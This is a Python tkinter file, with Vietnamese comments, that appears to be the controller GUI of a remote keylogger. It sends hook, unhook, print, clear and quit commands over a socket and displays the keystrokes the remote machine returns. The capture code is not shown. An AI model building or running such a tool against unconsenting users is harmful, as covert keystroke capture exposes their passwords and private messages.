import tkinter as tk
from keylog_designer import KeylogApp
class KeylogProcess(KeylogApp):
    def __init__(self, nw, client, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.nw = nw  # Lưu giá trị self.nw
        self.client = client
        self.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def hook(self):
        self.nw.write("HOOK\n")
        self.nw.flush()
        
    def unhook(self):
        self.nw.write("UNHOOK\n")
        self.nw.flush()
        
    def log_keys(self):
        self.nw.write("PRINT\n")
        self.nw.flush()
        
        data = self.client.recv(5000).decode()
        
        if "Enter" in data:
            data = data.replace("Enter", "\n")
    
        self.txtKQ.config(state=tk.NORMAL) # thiết lập trạng thái của Text widget self.txtKQ thành NORMAL, cho phép chỉnh sửa nội dung
        self.txtKQ.insert(tk.END, data + "\n") #chèn nội dung mới vào cuối của Text widget
        self.txtKQ.config(state=tk.DISABLED) #thiết lập lại trạng thái của Text widget self.txtKQ thành DISABLED, ngăn người dùng chỉnh sửa 
        
    def clear(self):
        self.nw.write("CLEAR\n")
        self.nw.flush()
        
        self.txtKQ.config(state=tk.NORMAL)
        self.txtKQ.delete(1.0, tk.END)
        self.txtKQ.config(state=tk.DISABLED)
        
        data = self.client.recv(5000).decode()
    
        self.txtKQ.config(state=tk.NORMAL) # thiết lập trạng thái của Text widget self.txtKQ thành NORMAL, cho phép chỉnh sửa nội dung
        self.txtKQ.insert(tk.END, data + "\n") #chèn nội dung mới vào cuối của Text widget
        self.txtKQ.config(state=tk.DISABLED)
        
    def on_close(self):
        if self.client:
            self.send_quit_command()
        self.destroy()

    def send_quit_command(self):
        message = "QUIT\n"
        self.nw.write(message)
        self.nw.flush()
        self.client.close()
        self.client = None
        
if __name__ == "__main__":
    root = tk.Tk()
    app = KeylogProcess(None, None)
    root.mainloop()